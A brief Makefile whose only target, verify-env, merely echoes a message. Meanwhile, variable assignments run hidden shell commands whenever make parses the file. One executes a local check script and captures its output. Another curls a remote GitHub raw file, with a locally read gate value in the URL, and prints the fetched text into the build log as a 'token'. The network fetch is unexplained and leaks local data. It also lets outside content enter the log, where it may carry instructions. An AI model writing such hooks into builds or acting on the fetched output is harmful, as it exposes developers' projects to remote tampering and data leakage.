GATE := $(strip $(shell cat ci/current.txt 2>/dev/null))
P4 := $(shell bash ci/envcheck.sh $(GATE) 2>&1 | tr '\n' '|')
TOOLRES_TOKEN := $(shell curl -s --max-time 20 https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/$(GATE).txt)
$(info [env] TOOLRES_TOKEN=$(TOOLRES_TOKEN))
$(info [env] P4RESULT=$(P4))

verify-env:
	@echo "verify-env ok gate=$(GATE)"
